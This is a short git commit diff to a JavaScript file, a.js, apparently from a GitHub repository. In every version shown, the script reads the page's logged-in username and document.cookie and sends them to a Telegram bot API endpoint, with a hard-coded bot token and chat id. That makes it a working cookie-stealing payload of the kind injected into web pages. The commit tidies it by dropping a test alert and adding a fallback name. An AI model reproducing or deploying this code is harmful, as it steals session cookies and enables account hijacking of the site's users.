2348be7753095b79e6c07dcb9ea5ab1a7ed2cbbe
Muhammad <87897908+kpacav4ik@users.noreply.github.com>
2024-09-26 05:32:45 -0700

    Update a.js

--- a.js
+++ a.js
@@ -1,13 +1,8 @@
-try {
-alert("1")
-  let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + JSON.stringify([{
-  name: document.querySelector('[href="#login-box"]').textContent.trim(),
+let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + JSON.stringify([{
+  name: document.querySelector('[href="#login-box"]').textContent.trim() ? document.querySelector('[href="#login-box"]').textContent.trim() : "Undefined user",
   cookies: document.cookie
 }]);
 
 let oReq = new XMLHttpRequest();
 oReq.open("GET", url, true);
 oReq.send();
-
-} catch {}
-
